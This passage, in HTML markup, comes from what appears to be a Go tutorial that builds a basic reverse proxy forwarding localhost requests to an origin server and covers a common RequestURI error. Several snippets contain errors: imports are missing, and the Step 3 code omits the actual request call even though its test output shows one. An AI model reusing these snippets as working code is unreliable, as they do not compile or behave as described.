&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;origin server] received request at: 2021-12-07 20:08:44.302807 +0100 CET &lt;span class="nv"&gt;m&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;+518.629994085
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#step-2-create-a-reverse-proxy-server"&gt;
  &lt;/a&gt;
  Step 2: Create a reverse proxy server &lt;a&gt;&lt;/a&gt;
&lt;/h4&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight go"&gt;&lt;code&gt;&lt;span class="k"&gt;package&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;

&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s"&gt;"fmt"&lt;/span&gt;
    &lt;span class="s"&gt;"log"&lt;/span&gt;
    &lt;span class="s"&gt;"net/http"&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;func&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

    &lt;span class="n"&gt;reverseProxy&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HandlerFunc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ResponseWriter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"[reverse proxy server] received request at: %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Now&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
    &lt;span class="p"&gt;})&lt;/span&gt;

    &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fatal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ListenAndServe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;":8080"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;reverseProxy&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h5&gt;
  &lt;a href="#step-2-test"&gt;
  &lt;/a&gt;
  Step 2 Test
&lt;/h5&gt;

&lt;p&gt;Start the server:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;go run main
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Use &lt;code&gt;curl&lt;/code&gt; command to validate reverse proxy works as expected:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;% curl &lt;span class="nt"&gt;-i&lt;/span&gt; localhost:8080
HTTP/1.1 200 OK
Date: Tue, 07 Dec 2021 19:17:45 GMT
Content-Length: 0
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the terminal of the reverse proxy server you should see:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;reverse proxy server] received request: 2021-12-07 20:09:44.302807 +0100 CET &lt;span class="nv"&gt;m&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;+518.629994085
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#step-3-forward-a-client-request-to-the-origin-server-via-reverse-proxy"&gt;
  &lt;/a&gt;
  Step 3: Forward a client request to the origin server (via reverse proxy) &lt;a&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;Next, we will update reverse proxy to forward a client request to the origin server. Update &lt;code&gt;main&lt;/code&gt; function as follows:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight go"&gt;&lt;code&gt;&lt;span class="k"&gt;func&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

  &lt;span class="c"&gt;// define origin server URL&lt;/span&gt;
    &lt;span class="n"&gt;originServerURL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"http://127.0.0.1:8081"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="no"&gt;nil&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fatal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"invalid origin server URL"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;reverseProxy&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HandlerFunc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ResponseWriter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"[reverse proxy server] received request at: %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Now&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;

    &lt;span class="c"&gt;// set req Host, URL and Request URI to forward a request to the origin server&lt;/span&gt;
        &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;originServerURL&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Host&lt;/span&gt;

        &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Scheme&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;originServerURL&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Scheme&lt;/span&gt;

    &lt;span class="c"&gt;// send a request to the origin server&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="no"&gt;nil&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StatusInternalServerError&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fprint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;})&lt;/span&gt;

    &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fatal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ListenAndServe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;":8080"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;reverseProxy&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h5&gt;
  &lt;a href="#step-3-test"&gt;
  &lt;/a&gt;
  Step 3 Test
&lt;/h5&gt;

&lt;p&gt;Start the server:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;go run main
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Use &lt;code&gt;curl&lt;/code&gt; command to validate reverse proxy works as expected:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;% curl &lt;span class="nt"&gt;-i&lt;/span&gt; localhost:8080
HTTP/1.1 200 OK
Date: Tue, 07 Dec 2021 19:35:19 GMT
Content-Length: 0
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the terminal of the reverse proxy server you should see:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;reverse proxy server] received request at: 2021-12-07 20:37:30.288783 +0100 CET &lt;span class="nv"&gt;m&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;+4.150788001
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the terminal of the origin server you should see:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;received request: 2021-12-07 20:37:30.290371 +0100 CET &lt;span class="nv"&gt;m&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;+97.775715418
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#step-4-copy-origin-server-response"&gt;
  &lt;/a&gt;
  Step 4: Copy Origin Server Response &lt;a&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;Once we were able to proxy a client response to the origin server, we need to get the response from the origin server back to the client. To do that, update the main function as follows:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight go"&gt;&lt;code&gt;
    &lt;span class="k"&gt;func&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

    &lt;span class="c"&gt;// define origin server URL&lt;/span&gt;
    &lt;span class="n"&gt;originServerURL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"http://127.0.0.1:8081"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="no"&gt;nil&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fatal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"invalid origin server URL"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;reverseProxy&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HandlerFunc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ResponseWriter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"[reverse proxy server] received request at: %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Now&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;

        &lt;span class="c"&gt;// set req Host, URL and Request URI to forward a request to the origin server&lt;/span&gt;
        &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;originServerURL&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Host&lt;/span&gt;
        &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;originServerURL&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Host&lt;/span&gt;
        &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Scheme&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;originServerURL&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Scheme&lt;/span&gt;
        &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RequestURI&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;""&lt;/span&gt;

      &lt;span class="c"&gt;// save the response from the origin server&lt;/span&gt;
        &lt;span class="n"&gt;originServerResponse&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DefaultClient&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Do&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="no"&gt;nil&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StatusInternalServerError&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fprint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;

      &lt;span class="c"&gt;// return response to the client&lt;/span&gt;
        &lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WriteHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StatusOK&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Copy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;originServerResponse&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;})&lt;/span&gt;

    &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fatal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ListenAndServe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;":8080"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;reverseProxy&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h5&gt;
  &lt;a href="#step-4-test"&gt;
  &lt;/a&gt;
  Step 4 Test
&lt;/h5&gt;

&lt;p&gt;Start the server:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;go run main
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Use &lt;code&gt;curl&lt;/code&gt; command to validate reverse proxy works as expected:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;% curl &lt;span class="nt"&gt;-i&lt;/span&gt; localhost:8080
HTTP/1.1 200 OK
Date: Tue, 07 Dec 2021 19:42:07 GMT
Content-Length: 22
Content-Type: text/plain&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;utf-8

origin server response%
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the terminal of the reverse proxy server you should see:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;reverse proxy server] received request at: 2021-12-07 20:42:07.654365 +0100 CET &lt;span class="nv"&gt;m&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;+5.612744376
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the terminal of the origin server you should see:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;received request: 2021-12-07 20:42:07.657175 +0100 CET &lt;span class="nv"&gt;m&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;+375.150991460
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#common-errors"&gt;
  &lt;/a&gt;
  Common errors  &lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Request.RequestURI can't be set in client request&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If the request is executed to the &lt;code&gt;http://localhost:8080/what-is-this&lt;/code&gt; the &lt;code&gt;RequestURI&lt;/code&gt; value will be &lt;code&gt;what-is-this&lt;/code&gt;. &lt;/p&gt;

&lt;p&gt;According to Go docs &lt;a href="https://go.dev/src/net/http/client.go"&gt;../src/net/http/client.go:217&lt;/a&gt;, &lt;code&gt;requestURI&lt;/code&gt; should always be set to &lt;code&gt;""&lt;/code&gt; before trying to send a request.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion &lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;In this article, reverse proxy explanation and its use cases were described. In addition, simple implementation of the reverse proxy in Go was provided.&lt;/p&gt;

&lt;p&gt;Readers are encouraged to try improve this example by implementing copying of the response headers, adding &lt;code&gt;X-Forwarded-For&lt;/code&gt; header and to implement HTTP2 support.&lt;/p&gt;

&lt;p&gt;Also, don't forget to watch this awesome talk &lt;a href="https://www.youtube.com/watch?v=tWSmUsYLiE4"&gt;FOSDEM 2019: How to write a reverse proxy with Go in 25 minutes.&lt;/a&gt; by Julien Salleyron on YT.&lt;/p&gt;
